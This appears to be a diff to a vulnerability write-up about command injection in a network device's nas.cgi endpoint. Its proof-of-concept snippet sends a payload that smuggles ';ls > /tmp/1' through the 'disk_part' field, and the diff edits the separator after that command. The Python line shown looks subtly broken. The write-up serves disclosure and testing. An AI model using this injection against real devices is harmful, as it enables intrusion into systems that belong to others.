@@ -24,7 +24,7 @@ and check the ';', but if ';' is in the first of string, bypass and cause comman
 ## POC
 ```
 url = "http://192.168.0.1/cgi-bin/nas.cgi"
-payload = ';ls > /tmp/1;' + '\n'
+payload = ';ls > /tmp/1  ' + '\n'
 
 r = requests.post(url, data={ 'page':'add_dir', 'disk_part': + payload})
 ``` 
